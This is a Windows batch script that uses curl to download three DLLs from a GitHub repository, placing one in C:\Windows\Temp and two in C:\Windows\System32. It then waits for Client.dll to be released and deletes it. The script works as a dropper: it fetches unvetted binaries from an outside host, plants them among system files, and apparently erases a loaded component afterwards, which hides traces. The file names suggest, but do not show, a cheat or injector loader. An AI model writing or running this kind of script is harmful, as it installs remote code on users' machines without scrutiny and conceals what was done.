@echo off
:: Batch script to download multiple files to specific paths

:: Define paths and URLs
set "temp_path=C:\Windows\Temp\Client.dll"
set "temp_url=https://raw.githubusercontent.com/Sniffer-Lexel/Ext/c76387227dc0f2c63e5c8e35e993d5f07af76754/Client.dll"

set "aobst_path=C:\Windows\System32\AotBst.dll"
set "aobst_url=https://raw.githubusercontent.com/Sniffer-Lexel/Ext/c76387227dc0f2c63e5c8e35e993d5f07af76754/AotBst.dll"

set "cimgui_path=C:\Windows\System32\cimgui.dll"
set "cimgui_url=https://raw.githubusercontent.com/Sniffer-Lexel/Ext/c76387227dc0f2c63e5c8e35e993d5f07af76754/cimgui.dll"

:: Download files using curl
echo Downloading Client.dll...
curl -o "%temp_path%" "%temp_url%"

echo Downloading AotBst.dll...
curl -o "%aobst_path%" "%aobst_url%"

echo Downloading cimgui.dll...
curl -o "%cimgui_path%" "%cimgui_url%"

:: Wait until Client.dll is no longer in use, then delete it
echo Waiting for Client.dll to be free for deletion...
:WaitLoop
(
    2>nul (
        move "%temp_path%" "%temp_path%"
    )
) || (
    timeout /t 2 >nul
    goto WaitLoop
)
del "%temp_path%"
echo Client.dll deleted successfully!

echo All tasks completed!
